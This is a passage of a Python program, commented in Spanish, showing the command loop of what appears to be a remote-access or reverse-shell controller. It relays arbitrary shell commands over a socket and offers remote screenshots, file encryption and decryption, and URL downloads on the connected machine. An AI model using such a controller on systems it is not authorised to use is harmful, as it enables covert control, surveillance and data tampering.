                            # Se manda a llamar a la funcion
                            # 'self.comprimir'
                            self.comprimir(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-i)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (zip)")
                        print(e)

                # unzip
                elif x.lower() == "unzip":
                    try:
                        if re.search(r"\s-i[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.descomprimir'
                            self.descomprimir(cmd)

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro de origen (-i)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (unzip)")
                        print(e)

                # encrypt
                elif x.lower() == "encrypt":
                    try:
                        if re.search(r"\s-k[= ]", cmd):
                            if re.search(r"\s-i[= ]", cmd):
                                # Se manda a llamar a la funcion
                                # 'self.encrypt'
                                self.encrypt(cmd)
                            else:
                                print(Fore.YELLOW + "[!] Falta del parametro encrypt (-i)")

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro key (-k)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (encrypt)")
                        print(e)

                # decrypt
                elif x.lower() == "decrypt":
                    try:
                        if re.search(r"\s-i[= ]", cmd):
                            if re.search(r"\s-k[= ]", cmd):
                                # Se manda a llamar a la funcion
                                # 'self.decrypt'
                                self.decrypt(cmd)
                            else:
                                print(Fore.YELLOW + "[!] Falta del parametro key (-k)")

                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro decrypt (-i)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (decrypt)")
                        print(e)

                # miwget
                elif x.lower() == "miwget":
                    try:
                        if re.search(r"\s-u[= ]", cmd):
                            # Se manda a llamar a la funcion
                            # 'self.wget'
                            self.wget(cmd)
                        else:
                            print(Fore.YELLOW + "[!] Falta del parametro url (-u)")

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (miwget)")
                        print(e)

                # lendir
                elif x.lower() == "lendir":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.lenDir'
                        self.lenDir(cmd)

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (lenDir)")
                        print(e)

                # save
                elif x.lower() == "save":
                    try:
                        # Se manda a llamar a la funcion
                        # 'self.save'
                        self.save(cmd)

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (save)")
                        print(e)

                # ss
                elif x.lower() == "ss":
                    try:
                        self.screenShot(cmd)

                    except Exception as e:
                        print(Fore.RED + "[-] Error de proceso (ss)")
                        print(e)

                # cmd
                else:
                    try:
                        if x.lower() == "open":
                            self.__conexion.send(cmd.encode())
                            info = self.__conexion.recv(1024).decode()
                            print(info)

                        else:
                            self.__conexion.send(cmd.encode())
                            while True:
                                info = self.recibirDatos().decode()
                                print(info)

                                if len(info) < self.__chunk:
                                    break

                    except Exception as e:
                        print(Fore.RED + "[-] Error al ejecutar el comando")
                        print(e)

            except Exception as e:
                self.printMsg(f"\n[-] Excepcion en el programa principal\n{str(e)}")
                break

        self.__conexion.close()
        self.__sock.close()

